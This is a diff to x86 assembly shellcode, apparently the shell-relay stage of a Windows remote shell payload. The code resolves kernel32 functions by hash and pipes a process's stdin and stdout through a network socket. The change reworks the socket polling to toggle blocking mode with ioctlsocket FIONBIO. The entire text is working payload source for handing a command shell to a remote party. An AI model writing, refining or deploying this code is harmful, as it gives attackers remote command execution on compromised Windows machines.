@@ -192,6 +192,11 @@ peek_stdout:                      ; PeekNamedPipe on stdout
   cmp eax, [edi]                  ; numAvail == 0
   je recv_client
 
+set_blocking:
+                                  ; zero = blocking
+  call call_fionbio
+                                  ; zero back in eax
+
 read_stdout:                      ; read on pipe2
   push eax                        ; make room for numRead
   mov ecx, esp                    ; numRead ptr
@@ -225,22 +230,14 @@ send_client:
 ; recv -> stdin
 
 recv_client:
-check_client:
-  mov eax, DATA_FIONREAD          ; FIONREAD
-  push eax                        ; argp
-  push esp                        ; argp ptr
-  push eax                        ; cmd
-  push DWORD DATA_SOCKET          ; socket
-  call FN_IOCTLSOCKET             ; ioctlsocket(socket, FIONBIO, on)
-  pop ecx                         ; get len
-  test eax, eax
-  jnz exit_process                ; ioctl error
-  test ecx, ecx
-  jz piper_loop                   ; no data
+set_nonblocking:
+  mov eax, esp                    ; non-zero non-blocking
+  call call_fionbio
+  xor eax, eax                    ; don't care about return value
 
 call_recv_client:
   push eax                        ; flags
-  push ecx                        ; len
+  push esi                        ; len
   push edi                        ; buffer
   push DWORD DATA_SOCKET          ; socket
   call FN_RECV                    ; recv()
@@ -277,7 +274,6 @@ write_stdin:
   jmp recv_client                  ; if we had data, try to recv again
 
 
-
 exit_process:
   push ebx                        ; kernel32 base
   HASH push, 'ExitProcess'        ; ExitProcess
@@ -285,3 +281,16 @@ exit_process:
   xor ecx, ecx
   push ecx
   call eax                        ; ExitProcess(0)
+
+; pass what you want in eax
+; returns value of argp in eax
+call_fionbio:
+  push eax                        ; argp
+  push esp                        ; argp ptr
+  push DATA_FIONBIO               ; cmd
+  push DWORD DATA_SOCKET          ; socket
+  call FN_IOCTLSOCKET             ; ioctlsocket(socket, FIONBIO, on)
+  test eax, eax
+  pop eax                         ; get len
+  jnz exit_process                ; ioctl error
+  ret
